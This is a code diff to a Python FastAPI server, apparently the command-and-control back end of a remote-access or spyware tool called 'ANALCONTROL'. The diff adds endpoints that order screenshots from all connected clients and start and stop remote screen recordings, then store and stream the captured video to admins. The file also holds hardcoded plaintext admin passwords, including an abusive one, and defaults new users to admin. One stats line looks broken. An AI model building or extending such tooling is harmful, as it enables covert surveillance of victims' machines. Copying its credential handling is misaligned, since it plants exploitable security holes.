@@ -79,7 +79,7 @@ class UserCreate(BaseModel):
     password: str = Field(..., example="password123")
     confirm_password: str = Field(..., example="password123")
     is_admin: bool = Field(default=True)
-    theme: str = Field(default="cyberpunk")
+    theme: str = Field(default="red_black")
 
 class UserUpdate(BaseModel):
     is_active: Optional[bool] = None
@@ -109,6 +109,13 @@ class ScreenshotRequest(BaseModel):
     image_data: str = Field(..., description="Base64 encoded image")
     filename: str = Field(..., example="screenshot.png")
 
+class RecordingRequest(BaseModel):
+    client_id: str = Field(..., example="client-001")
+    video_data: str = Field(..., description="Base64 encoded video")
+    filename: str = Field(..., example="recording.mp4")
+    duration: int = Field(default=30)
+    fps: int = Field(default=30)
+
 class SystemInfoRequest(BaseModel):
     client_id: str = Field(..., example="client-001")
     info: Dict[str, Any] = Field(default_factory=dict)
@@ -116,15 +123,11 @@ class SystemInfoRequest(BaseModel):
 class ChatMessage(BaseModel):
     message: str = Field(..., description="Message content")
     recipient: Optional[str] = Field(None, description="Recipient user ID (null for all)")
-    file_data: Optional[str] = Field(None, description="Base64 encoded file data")
-    file_name: Optional[str] = Field(None, description="File name")
-    file_type: Optional[str] = Field(None, description="File type")
-    is_voice_note: bool = Field(default=False)
 
 class UserTag(BaseModel):
     user_id: str
     role: str = Field(..., description="owner, sr_admin, admin, user")
-    color: Optional[str] = Field("#8a2be2", description="Tag color")
+    color: Optional[str] = Field("#ff2a2a", description="Tag color")
 
 # ========== SECURITY FUNCTIONS ==========
 def create_jwt_token(data: dict, expires_delta: Optional[timedelta] = None) -> str:
@@ -222,7 +225,7 @@ async def verify_supabase_user(email: str, password: str) -> Optional[dict]:
                 "id": user_data["id"],
                 "email": user_data["email"],
                 "is_admin": user_data.get("is_admin", False),
-                "theme": user_data.get("theme", "cyberpunk"),
+                "theme": user_data.get("theme", "red_black"),
                 "is_active": user_data.get("is_active", True)
             }
     
@@ -252,7 +255,7 @@ async def create_supabase_user(user_data: dict) -> Optional[dict]:
             "email": user_data["email"].lower(),
             "password_hash": hash_password(user_data["password"]),
             "is_admin": user_data.get("is_admin", False),
-            "theme": user_data.get("theme", "cyberpunk"),
+            "theme": user_data.get("theme", "red_black"),
             "is_active": True,
             "created_at": datetime.utcnow().isoformat(),
             "last_login": None
@@ -265,7 +268,7 @@ async def create_supabase_user(user_data: dict) -> Optional[dict]:
                 "id": response.data[0]["id"],
                 "email": response.data[0]["email"],
                 "is_admin": response.data[0].get("is_admin", False),
-                "theme": response.data[0].get("theme", "cyberpunk")
+                "theme": response.data[0].get("theme", "red_black")
             }
     
     except Exception as e:
@@ -283,14 +286,15 @@ class Database:
         self.sessions = {}
         self.chat_messages = []
         self.user_tags = {}
-        self.files = {}
+        self.screenshots = []
+        self.recordings = []
         self.client_heartbeats = {}
         self.system_info = []
         self.init_default_data()
         self.init_user_tags()
     
     def init_default_data(self):
-        # Default users
+        # Default users with red/black theme
         default_users = [
             {
                 "id": str(uuid.uuid4()),
@@ -298,7 +302,7 @@ class Database:
                 "password": "40671Mps19*",
                 "is_admin": True,
                 "is_active": True,
-                "theme": "cyberpunk",
+                "theme": "red_black",
                 "created_at": datetime.utcnow().isoformat(),
                 "last_login": None
             },
@@ -308,7 +312,7 @@ class Database:
                 "password": "admin123",
                 "is_admin": True,
                 "is_active": True,
-                "theme": "cyberpunk",
+                "theme": "red_black",
                 "created_at": datetime.utcnow().isoformat(),
                 "last_login": None
             },
@@ -318,7 +322,7 @@ class Database:
                 "password": "kidraper67",
                 "is_admin": True,
                 "is_active": True,
-                "theme": "cyberpunk",
+                "theme": "red_black",
                 "created_at": datetime.utcnow().isoformat(),
                 "last_login": None
             },
@@ -328,7 +332,7 @@ class Database:
                 "password": "femboy67",
                 "is_admin": True,
                 "is_active": True,
-                "theme": "femboy",
+                "theme": "red_black",
                 "created_at": datetime.utcnow().isoformat(),
                 "last_login": None
             }
@@ -367,7 +371,7 @@ class Database:
         self.user_tags["nathan"] = {
             "user_id": "nathan",
             "role": "admin",
-            "color": "#9d65ff",
+            "color": "#ff55ff",
             "can_create_accounts": False
         }
     
@@ -389,6 +393,20 @@ class Database:
     
     def get_user_tag(self, user_id: str):
         return self.user_tags.get(user_id.lower())
+    
+    def add_screenshot(self, screenshot_data: dict):
+        screenshot_id = str(uuid.uuid4())
+        screenshot_data["id"] = screenshot_id
+        screenshot_data["created_at"] = datetime.utcnow().isoformat()
+        self.screenshots.append(screenshot_data)
+        return screenshot_data
+    
+    def add_recording(self, recording_data: dict):
+        recording_id = str(uuid.uuid4())
+        recording_data["id"] = recording_id
+        recording_data["created_at"] = datetime.utcnow().isoformat()
+        self.recordings.append(recording_data)
+        return recording_data
     
     def update_client_heartbeat(self, client_id: str):
         """Update client heartbeat timestamp"""
@@ -412,6 +430,7 @@ class ConnectionManager:
         self.chat_connections: Dict[str, WebSocket] = {}
         self.connection_times: Dict[str, float] = {}
         self.pending_messages: Dict[str, List[dict]] = {}
+        self.active_recordings: Dict[str, bool] = {}
 
     async def connect_admin(self, websocket: WebSocket):
         await websocket.accept()
@@ -503,7 +522,7 @@ class ConnectionManager:
                             "user_id": user["email"],
                             "username": user["email"],
                             "role": tag["role"] if tag else "user",
-                            "color": tag["color"] if tag else "#8a2be2",
+                            "color": tag["color"] if tag else "#ff2a2a",
                             "online": True
                         })
                 
@@ -671,6 +690,18 @@ class ConnectionManager:
             
             logger.info(f"🖥️  Client timed out: {client_id}")
 
+    def start_recording(self, client_id: str):
+        """Mark client as recording"""
+        self.active_recordings[client_id] = True
+    
+    def stop_recording(self, client_id: str):
+        """Stop recording on client"""
+        self.active_recordings.pop(client_id, None)
+    
+    def is_recording(self, client_id: str) -> bool:
+        """Check if client is recording"""
+        return self.active_recordings.get(client_id, False)
+
 manager = ConnectionManager()
 
 # ========== API ROUTES ==========
@@ -706,7 +737,7 @@ async def login(data: LoginRequest):
                 "id": user["id"],
                 "email": user["email"],
                 "is_admin": user.get("is_admin", False),
-                "theme": user.get("theme", "cyberpunk"),
+                "theme": user.get("theme", "red_black"),
                 "is_active": user.get("is_active", True)
             }
             
@@ -720,7 +751,7 @@ async def login(data: LoginRequest):
             "email": user_data["email"],
             "is_admin": user_data["is_admin"],
             "user_id": user_data["id"],
-            "theme": user_data.get("theme", "cyberpunk")
+            "theme": user_data.get("theme", "red_black")
         }
         
         access_token = create_jwt_token(token_data)
@@ -732,7 +763,7 @@ async def login(data: LoginRequest):
                 "email": user_data["email"],
                 "is_admin": user_data["is_admin"],
                 "user_id": user_data["id"],
-                "theme": user_data.get("theme", "cyberpunk")
+                "theme": user_data.get("theme", "red_black")
             },
             "expires_in": 86400
         }
@@ -825,7 +856,7 @@ async def get_users(user: dict = Depends(authenticate_user)):
                 "id": user_data["id"],
                 "email": user_data["email"],
                 "is_admin": user_data.get("is_admin", False),
-                "theme": user_data.get("theme", "cyberpunk"),
+                "theme": user_data.get("theme", "red_black"),
                 "is_active": user_data.get("is_active", True),
                 "created_at": user_data.get("created_at"),
                 "last_login": user_data.get("last_login")
@@ -1168,13 +1199,15 @@ async def upload_screenshot(data: ScreenshotRequest):
             raise HTTPException(status_code=400, detail="Invalid image data")
         
         # Store in memory
-        screenshot_metadata = {
-            "id": str(uuid.uuid4()),
+        screenshot_data = {
             "client_id": data.client_id,
             "filename": data.filename,
+            "image_data": data.image_data,
             "size": len(image_data),
             "created_at": datetime.utcnow().isoformat()
         }
+        
+        db.add_screenshot(screenshot_data)
         
         # Store in Supabase if available
         if supabase:
@@ -1211,6 +1244,15 @@ async def upload_screenshot(data: ScreenshotRequest):
             except Exception as e:
                 logger.error(f"Supabase screenshot log error: {e}")
         
+        # Notify admins
+        await manager.notify_admins({
+            "type": "screenshot_received",
+            "client_id": data.client_id,
+            "filename": data.filename,
+            "size": len(image_data),
+            "timestamp": datetime.utcnow().isoformat()
+        })
+        
         return {
             "success": True,
             "message": "Screenshot uploaded",
@@ -1220,6 +1262,91 @@ async def upload_screenshot(data: ScreenshotRequest):
         
     except Exception as e:
         logger.error(f"Upload screenshot error: {e}")
+        raise HTTPException(status_code=500, detail="Internal server error")
+
+@app.post("/api/recording", response_model=dict)
+async def upload_recording(data: RecordingRequest):
+    """Upload screen recording"""
+    try:
+        # Validate video data
+        try:
+            video_data = base64.b64decode(data.video_data)
+        except:
+            raise HTTPException(status_code=400, detail="Invalid video data")
+        
+        # Store in memory
+        recording_data = {
+            "client_id": data.client_id,
+            "filename": data.filename,
+            "video_data": data.video_data,
+            "size": len(video_data),
+            "duration": data.duration,
+            "fps": data.fps,
+            "created_at": datetime.utcnow().isoformat()
+        }
+        
+        db.add_recording(recording_data)
+        
+        # Store in Supabase if available
+        if supabase:
+            try:
+                supabase.table("recordings").insert({
+                    "client_id": data.client_id,
+                    "filename": data.filename,
+                    "video_data": data.video_data,
+                    "size": len(video_data),
+                    "duration": data.duration,
+                    "fps": data.fps,
+                    "created_at": datetime.utcnow().isoformat()
+                }).execute()
+            except Exception as e:
+                logger.error(f"Supabase recording storage error: {e}")
+        
+        # Stop recording flag
+        manager.stop_recording(data.client_id)
+        
+        # Add log
+        log_entry = {
+            "id": str(uuid.uuid4()),
+            "client_id": data.client_id,
+            "log_type": "info",
+            "message": f"Recording saved: {data.filename} ({data.duration}s)",
+            "created_at": datetime.utcnow().isoformat()
+        }
+        
+        db.logs.append(log_entry)
+        
+        if supabase:
+            try:
+                supabase.table("logs").insert({
+                    "client_id": data.client_id,
+                    "log_type": "info",
+                    "message": f"Recording saved: {data.filename}",
+                    "created_at": datetime.utcnow().isoformat()
+                }).execute()
+            except Exception as e:
+                logger.error(f"Supabase recording log error: {e}")
+        
+        # Notify admins
+        await manager.notify_admins({
+            "type": "recording_received",
+            "client_id": data.client_id,
+            "filename": data.filename,
+            "size": len(video_data),
+            "duration": data.duration,
+            "timestamp": datetime.utcnow().isoformat()
+        })
+        
+        return {
+            "success": True,
+            "message": "Recording uploaded",
+            "filename": data.filename,
+            "size": len(video_data),
+            "duration": data.duration
+        }
+        
+    except Exception as e:
+        logger.error(f"Upload recording error: {e}")
         raise HTTPException(status_code=500, detail="Internal server error")
 
 @app.post("/api/system-info", response_model=dict)
@@ -1361,6 +1488,390 @@ async def get_logs(
         logger.error(f"Get logs error: {e}")
         raise HTTPException(status_code=500, detail="Internal server error")
 
+@app.get("/api/screenshots", response_model=dict)
+async def get_screenshots(
+    user: dict = Depends(authenticate_user),
+    client_id: Optional[str] = Query(None),
+    limit: int = Query(50, ge=1, le=1000)
+):
+    """Get all screenshots"""
+    try:
+        screenshots_list = []
+        
+        # Get from Supabase if available
+        if supabase:
+            query = supabase.table("screenshots").select("*")
+            
+            if client_id:
+                query = query.eq("client_id", client_id)
+            
+            response = query.order("created_at", desc=True).limit(limit).execute()
+            
+            if response.data:
+                screenshots_list = response.data
+        else:
+            # Fallback to in-memory
+            screenshots_list = db.screenshots.copy()
+            
+            # Apply filters
+            if client_id:
+                screenshots_list = [s for s in screenshots_list if s.get("client_id") == client_id]
+            
+            # Sort by date
+            screenshots_list.sort(key=lambda x: x.get("created_at", ""), reverse=True)
+            screenshots_list = screenshots_list[:limit]
+        
+        return {
+            "success": True,
+            "screenshots": screenshots_list
+        }
+    except Exception as e:
+        logger.error(f"Get screenshots error: {e}")
+        raise HTTPException(status_code=500, detail="Internal server error")
+
+@app.post("/api/screenshot/all", response_model=dict)
+async def screenshot_all_clients(user: dict = Depends(authenticate_user)):
+    """Request screenshots from all clients"""
+    try:
+        # Get all online clients
+        online_clients = list(manager.client_connections.keys())
+        
+        for client_id in online_clients:
+            await manager.send_to_client(client_id, {
+                "type": "screenshot_request",
+                "timestamp": datetime.utcnow().isoformat(),
+                "from_user": user.get("email", "unknown")
+            })
+        
+        return {
+            "success": True,
+            "message": f"Screenshot requests sent to {len(online_clients)} clients",
+            "count": len(online_clients)
+        }
+    except Exception as e:
+        logger.error(f"Screenshot all error: {e}")
+        raise HTTPException(status_code=500, detail="Internal server error")
+
+@app.get("/api/screenshot/{screenshot_id}/download")
+async def download_screenshot(
+    screenshot_id: str,
+    user: dict = Depends(authenticate_user)
+):
+    """Download a screenshot"""
+    try:
+        screenshot = None
+        
+        # Get from Supabase if available
+        if supabase:
+            response = supabase.table("screenshots")\
+                .select("*")\
+                .eq("id", screenshot_id)\
+                .execute()
+            
+            if response.data:
+                screenshot = response.data[0]
+        
+        # Fallback to in-memory
+        if not screenshot:
+            screenshot = next((s for s in db.screenshots if s.get("id") == screenshot_id), None)
+        
+        if not screenshot:
+            raise HTTPException(status_code=404, detail="Screenshot not found")
+        
+        image_data = base64.b64decode(screenshot["image_data"])
+        
+        return StreamingResponse(
+            io.BytesIO(image_data),
+            media_type="image/png",
+            headers={
+                "Content-Disposition": f'attachment; filename="{screenshot["filename"]}"'
+            }
+        )
+        
+    except HTTPException:
+        raise
+    except Exception as e:
+        logger.error(f"Download screenshot error: {e}")
+        raise HTTPException(status_code=500, detail="Internal server error")
+
+@app.delete("/api/screenshot/{screenshot_id}", response_model=dict)
+async def delete_screenshot(
+    screenshot_id: str,
+    user: dict = Depends(authenticate_user)
+):
+    """Delete a screenshot"""
+    try:
+        # Delete from Supabase if available
+        if supabase:
+            supabase.table("screenshots")\
+                .delete()\
+                .eq("id", screenshot_id)\
+                .execute()
+        
+        # Delete from memory
+        db.screenshots = [s for s in db.screenshots if s.get("id") != screenshot_id]
+        
+        return {"success": True, "message": "Screenshot deleted"}
+    except Exception as e:
+        logger.error(f"Delete screenshot error: {e}")
+        raise HTTPException(status_code=500, detail="Internal server error")
+
+@app.get("/api/recordings", response_model=dict)
+async def get_recordings(
+    user: dict = Depends(authenticate_user),
+    client_id: Optional[str] = Query(None),
+    limit: int = Query(50, ge=1, le=1000)
+):
+    """Get all screen recordings"""
+    try:
+        recordings_list = []
+        
+        # Get from Supabase if available
+        if supabase:
+            query = supabase.table("recordings").select("*")
+            
+            if client_id:
+                query = query.eq("client_id", client_id)
+            
+            response = query.order("created_at", desc=True).limit(limit).execute()
+            
+            if response.data:
+                recordings_list = response.data
+        else:
+            # Fallback to in-memory
+            recordings_list = db.recordings.copy()
+            
+            # Apply filters
+            if client_id:
+                recordings_list = [r for r in recordings_list if r.get("client_id") == client_id]
+            
+            # Sort by date
+            recordings_list.sort(key=lambda x: x.get("created_at", ""), reverse=True)
+            recordings_list = recordings_list[:limit]
+        
+        return {
+            "success": True,
+            "recordings": recordings_list
+        }
+    except Exception as e:
+        logger.error(f"Get recordings error: {e}")
+        raise HTTPException(status_code=500, detail="Internal server error")
+
+@app.post("/api/recording/start", response_model=dict)
+async def start_recording(
+    data: dict,
+    user: dict = Depends(authenticate_user)
+):
+    """Start screen recording on client"""
+    try:
+        client_id = data.get("client_id")
+        duration = data.get("duration", 30)
+        fps = data.get("fps", 30)
+        quality = data.get("quality", "medium")
+        
+        if not client_id:
+            raise HTTPException(status_code=400, detail="Client ID required")
+        
+        sent = await manager.send_to_client(client_id, {
+            "type": "start_recording",
+            "duration": duration,
+            "fps": fps,
+            "quality": quality,
+            "from_user": user.get("email", "unknown"),
+            "timestamp": datetime.utcnow().isoformat()
+        })
+        
+        if sent:
+            # Mark as recording
+            manager.start_recording(client_id)
+            
+            # Notify admins
+            await manager.notify_admins({
+                "type": "recording_started",
+                "client_id": client_id,
+                "duration": duration,
+                "fps": fps,
+                "quality": quality,
+                "timestamp": datetime.utcnow().isoformat()
+            })
+        
+        if not sent:
+            # Store recording request for later
+            recording_id = str(uuid.uuid4())
+            recording_request = {
+                "id": recording_id,
+                "client_id": client_id,
+                "duration": duration,
+                "fps": fps,
+                "quality": quality,
+                "status": "pending",
+                "user_email": user.get("email", "unknown"),
+                "created_at": datetime.utcnow().isoformat()
+            }
+            
+            if supabase:
+                try:
+                    supabase.table("recording_requests").insert(recording_request).execute()
+                except Exception as e:
+                    logger.error(f"Supabase recording request error: {e}")
+        
+        return {
+            "success": True,
+            "message": "Recording started",
+            "client_id": client_id,
+            "sent_via_websocket": sent
+        }
+        
+    except Exception as e:
+        logger.error(f"Start recording error: {e}")
+        raise HTTPException(status_code=500, detail="Internal server error")
+
+@app.post("/api/recording/stop", response_model=dict)
+async def stop_recording(
+    data: dict,
+    user: dict = Depends(authenticate_user)
+):
+    """Stop screen recording on client"""
+    try:
+        client_id = data.get("client_id")
+        
+        if not client_id:
+            raise HTTPException(status_code=400, detail="Client ID required")
+        
+        sent = await manager.send_to_client(client_id, {
+            "type": "stop_recording",
+            "timestamp": datetime.utcnow().isoformat(),
+            "from_user": user.get("email", "unknown")
+        })
+        
+        if sent:
+            # Stop recording
+            manager.stop_recording(client_id)
+            
+            # Notify admins
+            await manager.notify_admins({
+                "type": "recording_stopped",
+                "client_id": client_id,
+                "timestamp": datetime.utcnow().isoformat()
+            })
+        
+        return {
+            "success": True,
+            "message": "Stop recording command sent",
+            "client_id": client_id,
+            "sent_via_websocket": sent
+        }
+        
+    except Exception as e:
+        logger.error(f"Stop recording error: {e}")
+        raise HTTPException(status_code=500, detail="Internal server error")
+
+@app.get("/api/recording/{recording_id}/download")
+async def download_recording(
+    recording_id: str,
+    user: dict = Depends(authenticate_user)
+):
+    """Download a screen recording"""
+    try:
+        recording = None
+        
+        # Get from Supabase if available
+        if supabase:
+            response = supabase.table("recordings")\
+                .select("*")\
+                .eq("id", recording_id)\
+                .execute()
+            
+            if response.data:
+                recording = response.data[0]
+        
+        # Fallback to in-memory
+        if not recording:
+            recording = next((r for r in db.recordings if r.get("id") == recording_id), None)
+        
+        if not recording:
+            raise HTTPException(status_code=404, detail="Recording not found")
+        
+        video_data = base64.b64decode(recording["video_data"])
+        
+        return StreamingResponse(
+            io.BytesIO(video_data),
+            media_type="video/mp4",
+            headers={
+                "Content-Disposition": f'attachment; filename="{recording["filename"]}"'
+            }
+        )
+        
+    except HTTPException:
+        raise
+    except Exception as e:
+        logger.error(f"Download recording error: {e}")
+        raise HTTPException(status_code=500, detail="Internal server error")
+
+@app.get("/api/recording/{recording_id}/play")
+async def play_recording(
+    recording_id: str,
+    user: dict = Depends(authenticate_user)
+):
+    """Stream a recording for playback"""
+    try:
+        recording = None
+        
+        # Get from Supabase if available
+        if supabase:
+            response = supabase.table("recordings")\
+                .select("*")\
+                .eq("id", recording_id)\
+                .execute()
+            
+            if response.data:
+                recording = response.data[0]
+        
+        # Fallback to in-memory
+        if not recording:
+            recording = next((r for r in db.recordings if r.get("id") == recording_id), None)
+        
+        if not recording:
+            raise HTTPException(status_code=404, detail="Recording not found")
+        
+        video_data = base64.b64decode(recording["video_data"])
+        
+        return StreamingResponse(
+            io.BytesIO(video_data),
+            media_type="video/mp4",
+            headers={
+                "Content-Disposition": f'inline; filename="{recording["filename"]}"'
+            }
+        )
+        
+    except HTTPException:
+        raise
+    except Exception as e:
+        logger.error(f"Play recording error: {e}")
+        raise HTTPException(status_code=500, detail="Internal server error")
+
+@app.delete("/api/recording/{recording_id}", response_model=dict)
+async def delete_recording(
+    recording_id: str,
+    user: dict = Depends(authenticate_user)
+):
+    """Delete a recording"""
+    try:
+        # Delete from Supabase if available
+        if supabase:
+            supabase.table("recordings")\
+                .delete()\
+                .eq("id", recording_id)\
+                .execute()
+        
+        # Delete from memory
+        db.recordings = [r for r in db.recordings if r.get("id") != recording_id]
+        
+        return {"success": True, "message": "Recording deleted"}
+    except Exception as e:
+        logger.error(f"Delete recording error: {e}")
+        raise HTTPException(status_code=500, detail="Internal server error")
+
 @app.get("/api/stats", response_model=dict)
 async def get_stats(user: dict = Depends(authenticate_user)):
     """Get system statistics"""
@@ -1373,9 +1884,11 @@ async def get_stats(user: dict = Depends(authenticate_user)):
             "total_commands": 0,
             "today_logs": 0,
             "total_screenshots": 0,
+            "total_recordings": 0,
             "total_users": 0,
             "active_admins": len(manager.admin_connections),
-            "chat_users": len(manager.chat_connections)
+            "chat_users": len(manager.chat_connections),
+            "active_recordings": len(manager.active_recordings)
         }
         
         # Get from Supabase if available
@@ -1387,6 +1900,7 @@ async def get_stats(user: dict = Depends(authenticate_user)):
                 commands_resp = supabase.table("commands").select("count").execute()
                 pending_resp = supabase.table("commands").select("count").eq("status", "pending").execute()
                 screenshots_resp = supabase.table("screenshots").select("count").execute()
+                recordings_resp = supabase.table("recordings").select("count").execute()
                 users_resp = supabase.table("users").select("count").execute()
                 
                 # Get today's logs
@@ -1408,6 +1922,8 @@ async def get_stats(user: dict = Depends(authenticate_user)):
                     stats["today_logs"] = logs_resp.data[0]["count"]
                 if screenshots_resp.data:
                     stats["total_screenshots"] = screenshots_resp.data[0]["count"]
+                if recordings_resp.data:
+                    stats["total_recordings"] = recordings_resp.data[0]["count"]
                 if users_resp.data:
                     stats["total_users"] = users_resp.data[0]["count"]
                     
@@ -1416,10 +1932,12 @@ async def get_stats(user: dict = Depends(authenticate_user)):
         
         # Add in-memory data
         stats["total_clients"] = max(stats["total_clients"], len(db.clients))
-        stats["online_clients"] = max(stats["online_clients"], len([c for c in db.clients.values() if c.get("online")]))
+        stats["online_clients"] = max(stats["online_clients"], len([c for c in db.clients if c.get("online")]))
         stats["total_commands"] = max(stats["total_commands"], len(db.commands))
         stats["pending_commands"] = max(stats["pending_commands"], len([c for c in db.commands if c.get("status") in ["pending", "running"]]))
         stats["today_logs"] = max(stats["today_logs"], len([l for l in db.logs if l.get("created_at", "").startswith(datetime.utcnow().date().isoformat())]))
+        stats["total_screenshots"] = max(stats["total_screenshots"], len(db.screenshots))
+        stats["total_recordings"] = max(stats["total_recordings"], len(db.recordings))
         stats["total_users"] = max(stats["total_users"], len(db.users))
         
         return {
@@ -1619,7 +2137,7 @@ async def get_conversations(user: dict = Depends(authenticate_user)):
                     "user_id": user_email,
                     "username": user_email,
                     "role": tag["role"] if tag else "user",
-                    "color": tag["color"] if tag else "#8a2be2",
+                    "color": tag["color"] if tag else "#ff2a2a",
                     "online": user_email in manager.chat_connections
                 })
         
@@ -1656,7 +2174,7 @@ async def get_chat_users(user: dict = Depends(authenticate_user)):
             "user_id": "all",
             "username": "Global Chat",
             "role": "global",
-            "color": "#00ffff",
+            "color": "#ff5555",
             "online": True,
             "last_seen": datetime.utcnow().isoformat()
         })
@@ -1673,7 +2191,7 @@ async def get_chat_users(user: dict = Depends(authenticate_user)):
                 "user_id": user_email,
                 "username": user_email,
                 "role": tag["role"] if tag else "user",
-                "color": tag["color"] if tag else "#8a2be2",
+                "color": tag["color"] if tag else "#ff2a2a",
                 "online": user_email in online_users,
                 "last_seen": user_obj.get("last_login")
             })
@@ -1685,105 +2203,6 @@ async def get_chat_users(user: dict = Depends(authenticate_user)):
         
     except Exception as e:
         logger.error(f"Get chat users error: {e}")
-        raise HTTPException(status_code=500, detail="Internal server error")
-
-@app.post("/api/chat/upload-file", response_model=dict)
-async def upload_chat_file(
-    file: UploadFile = File(...),
-    user: dict = Depends(authenticate_user)
-):
-    """Upload a file for chat"""
-    try:
-        # Read file
-        contents = await file.read()
-        
-        # Convert to base64
-        file_data = base64.b64encode(contents).decode('utf-8')
-        
-        # Determine file type
-        file_type = file.content_type or mimetypes.guess_type(file.filename)[0] or "application/octet-stream"
-        
-        # Store file
-        file_id = str(uuid.uuid4())
-        file_record = {
-            "id": file_id,
-            "file_name": file.filename,
-            "file_type": file_type,
-            "size": len(contents),
-            "uploader": user.get("email"),
-            "uploaded_at": datetime.utcnow().isoformat(),
-            "data": file_data
-        }
-        
-        db.files[file_id] = file_record
-        
-        # Store in Supabase
-        if supabase:
-            try:
-                supabase.table("chat_files").insert({
-                    "id": file_id,
-                    "file_name": file.filename,
-                    "file_type": file_type,
-                    "size": len(contents),
-                    "uploader": user.get("email"),
-                    "uploaded_at": datetime.utcnow().isoformat(),
-                    "data": file_data
-                }).execute()
-            except Exception as e:
-                logger.error(f"Supabase file storage error: {e}")
-        
-        return {
-            "success": True,
-            "file_id": file_id,
-            "file_name": file.filename,
-            "file_type": file_type,
-            "size": len(contents),
-            "download_url": f"/api/chat/download/{file_id}"
-        }
-        
-    except Exception as e:
-        logger.error(f"File upload error: {e}")
-        raise HTTPException(status_code=500, detail="Internal server error")
-
-@app.get("/api/chat/download/{file_id}")
-async def download_chat_file(
-    file_id: str,
-    user: dict = Depends(authenticate_user)
-):
-    """Download a chat file"""
-    try:
-        # Get file from database
-        if supabase:
-            response = supabase.table("chat_files")\
-                .select("*")\
-                .eq("id", file_id)\
-                .execute()
-            
-            if not response.data:
-                raise HTTPException(status_code=404, detail="File not found")
-            
-            file_record = response.data[0]
-        else:
-            file_record = db.files.get(file_id)
-            if not file_record:
-                raise HTTPException(status_code=404, detail="File not found")
-        
-        # Decode base64 data
-        file_data = base64.b64decode(file_record["data"])
-        
-        # Return file
-        return StreamingResponse(
-            io.BytesIO(file_data),
-            media_type=file_record["file_type"],
-            headers={
-                "Content-Disposition": f'attachment; filename="{file_record["file_name"]}"'
-            }
-        )
-        
-    except HTTPException:
-        raise
-    except Exception as e:
-        logger.error(f"File download error: {e}")
         raise HTTPException(status_code=500, detail="Internal server error")
 
 @app.post("/api/chat/mark-read/{message_id}", response_model=dict)
@@ -1819,19 +2238,9 @@ async def send_chat_message(data: ChatMessage, user: dict = Depends(authenticate
             "sender": user_id,
             "recipient": data.recipient if data.recipient != "all" else None,
             "message": data.message,
-            "is_voice_note": data.is_voice_note,
             "timestamp": datetime.utcnow().isoformat(),
             "read_by": [user_id]
         }
-        
-        # Add file data if present
-        if data.file_data:
-            message_data.update({
-                "file_data": data.file_data,
-                "file_name": data.file_name,
-                "file_type": data.file_type,
-                "size": len(base64.b64decode(data.file_data)) if data.file_data else 0
-            })
         
         # Get sender tag
         sender_tag = db.get_user_tag(user_id)
@@ -1908,6 +2317,7 @@ async def health_check():
             "chat_users": len(manager.chat_connections),
             "total_users": len(db.users),
             "total_clients": len(db.clients),
+            "active_recordings": len(manager.active_recordings),
             "supabase_connected": supabase is not None
         }
         
@@ -1924,7 +2334,7 @@ async def health_check():
 async def get_user_theme(user: dict = Depends(authenticate_user)):
     """Get user's theme"""
     try:
-        theme = user.get("theme", "cyberpunk")
+        theme = user.get("theme", "red_black")
         return {
             "success": True,
             "theme": theme,
@@ -2153,7 +2563,7 @@ async def handle_client_message(client_id: str, data: dict, websocket: WebSocket
                 "message": f"[Client {client_id}]: {message}",
                 "timestamp": datetime.utcnow().isoformat(),
                 "recipient": "all",
-                "sender_tag": {"role": "client", "color": "#32cd32"}
+                "sender_tag": {"role": "client", "color": "#00ff00"}
             }
             
             db.chat_messages.append(chat_msg)
@@ -2170,7 +2580,7 @@ async def handle_client_message(client_id: str, data: dict, websocket: WebSocket
             await manager.broadcast_chat({
                 "type": "new_message",
                 "message": chat_msg,
-                "sender_tag": {"role": "client", "color": "#32cd32"},
+                "sender_tag": {"role": "client", "color": "#00ff00"},
                 "timestamp": datetime.utcnow().isoformat()
             })
             
@@ -2180,6 +2590,101 @@ async def handle_client_message(client_id: str, data: dict, websocket: WebSocket
                 "message": "Message received by server",
                 "timestamp": datetime.utcnow().isoformat()
             })
+    
+    elif message_type == "screenshot_result":
+        # Handle screenshot from client
+        image_data = data.get("image_data")
+        filename = data.get("filename", f"screenshot_{client_id}_{datetime.utcnow().strftime('%Y%m%d_%H%M%S')}.png")
+        
+        if image_data:
+            screenshot_data = {
+                "client_id": client_id,
+                "filename": filename,
+                "image_data": image_data,
+                "size": len(base64.b64decode(image_data)),
+                "created_at": datetime.utcnow().isoformat()
+            }
+            
+            db.add_screenshot(screenshot_data)
+            
+            if supabase:
+                try:
+                    supabase.table("screenshots").insert({
+                        "client_id": client_id,
+                        "filename": filename,
+                        "image_data": image_data,
+                        "size": len(base64.b64decode(image_data)),
+                        "created_at": datetime.utcnow().isoformat()
+                    }).execute()
+                except Exception as e:
+                    logger.error(f"Supabase screenshot storage error: {e}")
+            
+            await manager.notify_admins({
+                "type": "screenshot_received",
+                "client_id": client_id,
+                "filename": filename,
+                "timestamp": datetime.utcnow().isoformat()
+            })
+    
+    elif message_type == "recording_result":
+        # Handle recording from client
+        video_data = data.get("video_data")
+        filename = data.get("filename", f"recording_{client_id}_{datetime.utcnow().strftime('%Y%m%d_%H%M%S')}.mp4")
+        duration = data.get("duration", 30)
+        fps = data.get("fps", 30)
+        
+        if video_data:
+            recording_data = {
+                "client_id": client_id,
+                "filename": filename,
+                "video_data": video_data,
+                "size": len(base64.b64decode(video_data)),
+                "duration": duration,
+                "fps": fps,
+                "created_at": datetime.utcnow().isoformat()
+            }
+            
+            db.add_recording(recording_data)
+            
+            if supabase:
+                try:
+                    supabase.table("recordings").insert({
+                        "client_id": client_id,
+                        "filename": filename,
+                        "video_data": video_data,
+                        "size": len(base64.b64decode(video_data)),
+                        "duration": duration,
+                        "fps": fps,
+                        "created_at": datetime.utcnow().isoformat()
+                    }).execute()
+                except Exception as e:
+                    logger.error(f"Supabase recording storage error: {e}")
+            
+            manager.stop_recording(client_id)
+            
+            await manager.notify_admins({
+                "type": "recording_received",
+                "client_id": client_id,
+                "filename": filename,
+                "duration": duration,
+                "timestamp": datetime.utcnow().isoformat()
+            })
+    
+    elif message_type == "recording_started":
+        manager.start_recording(client_id)
+        await manager.notify_admins({
+            "type": "recording_started",
+            "client_id": client_id,
+            "timestamp": datetime.utcnow().isoformat()
+        })
+    
+    elif message_type == "recording_stopped":
+        manager.stop_recording(client_id)
+        await manager.notify_admins({
+            "type": "recording_stopped",
+            "client_id": client_id,
+            "timestamp": datetime.utcnow().isoformat()
+        })
 
 @app.websocket("/ws/chat/{user_id}")
 async def websocket_chat(websocket: WebSocket, user_id: str):
@@ -2273,10 +2778,13 @@ async def serve_frontend():
         return JSONResponse({
             "message": "ANALCONTROL API is running",
             "version": "3.0",
+            "theme": "red_black",
             "endpoints": {
                 "login": "/api/login",
                 "docs": "/docs",
                 "health": "/api/health",
